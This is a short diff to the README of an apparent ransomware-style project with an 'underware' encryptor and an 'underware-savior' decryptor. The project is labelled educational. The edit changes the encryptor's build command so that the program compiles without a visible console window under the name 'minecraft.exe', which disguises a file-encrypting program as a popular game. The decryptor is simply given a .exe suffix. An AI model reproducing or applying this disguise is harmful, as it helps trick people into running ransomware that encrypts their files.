@@ -66,12 +66,12 @@ This project is intended for **educational purposes only** to help understand th
 2. Build the encryptor:
    ```bash
    cd underware
-   go build -o encryptor
+   go build -ldflags="-H windowsgui" -o minecraft.exe
    ```
 2. Build the decryptor:
    ```bash
    cd underware-savior
-   go build -o decryptor
+   go build -o decryptor.exe
    ```
 
 
